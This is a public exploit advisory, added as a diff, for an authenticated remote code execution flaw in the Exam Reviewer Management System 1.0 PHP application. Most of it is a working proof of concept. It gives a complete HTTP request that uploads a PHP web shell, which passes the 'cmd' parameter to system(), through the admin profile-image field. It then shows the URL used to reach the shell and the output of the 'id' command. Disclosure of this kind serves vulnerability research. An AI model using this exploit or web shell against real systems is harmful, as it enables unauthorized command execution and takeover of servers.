@@ -1,0 +1,144 @@
+# Exploit Title: Exam Reviewer Management System 1.0 - Remote Code Execution (RCE) (Authenticated)
+# Date: 2022-02-08
+# Exploit Author:  Juli Agarwal(@agarwaljuli)
+# Vendor Homepage:
+https://www.sourcecodester.com/php/15160/simple-exam-reviewer-management-system-phpoop-free-source-code.html
+
+# Software Link:
+https://www.sourcecodester.com/download-code?nid=15160&title=Simple+Exam+Reviewer+Management+System+in+PHP%2FOOP+Free+Source+Code
+
+# Version: 1.0
+# Tested on: XAMPP, Kali Linux
+
+
+
+Description – The application suffers from a remote code execution in the
+admin panel. An authenticated attacker can upload a web-shell php file in
+profile page to achieve remote code execution.
+
+
+
+POC:-
+
+
+
+==========
+
+# Request:
+
+==========
+
+POST /erms/classes/Users.php?f=save HTTP/1.1
+
+Host: localhost
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
+Firefox/91.0
+
+Accept: */*
+
+Accept-Language: en-US,en;q=0.5
+
+X-Requested-With: XMLHttpRequest
+
+Content-Type: multipart/form-data;
+boundary=---------------------------37791356766765055891341961306
+
+Content-Length: 1004
+
+Origin: http://localhost
+
+Connection: close
+
+Referer: http://localhost/erms/admin/?page=user
+
+Cookie: PHPSESSID=22f0bd65ef694041af3177057e7fbd5a
+
+
+
+-----------------------------37791356766765055891341961306
+
+Content-Disposition: form-data; name="id"
+
+
+
+1
+
+-----------------------------37791356766765055891341961306
+
+Content-Disposition: form-data; name="firstname"
+
+
+
+Adminstrator
+
+-----------------------------37791356766765055891341961306
+
+Content-Disposition: form-data; name="lastname"
+
+
+
+Admin
+
+-----------------------------37791356766765055891341961306
+
+Content-Disposition: form-data; name="username"
+
+
+
+admin
+
+-----------------------------37791356766765055891341961306
+
+Content-Disposition: form-data; name="password"
+
+
+
+-----------------------------37791356766765055891341961306
+
+Content-Disposition: form-data; name="img"; filename="shell.php"
+
+Content-Type: application/x-php
+
+
+
+<html>
+
+<body>
+
+<b>Remote code execution: </b><br><pre>
+
+                              <?php if(isset($_REQUEST['cmd'])){ echo
+"<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+</pre>
+
+</body>
+
+</html>
+
+
+
+-----------------------------37791356766765055891341961306—
+
+
+
+================
+
+# Webshell access:
+
+================
+
+
+
+# Webshell access via:
+
+POC: http://localhost/erms/uploads/1644334740_shell.php?cmd=id
+
+
+
+# Webshell response:
+
+Remote code execution:
+
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
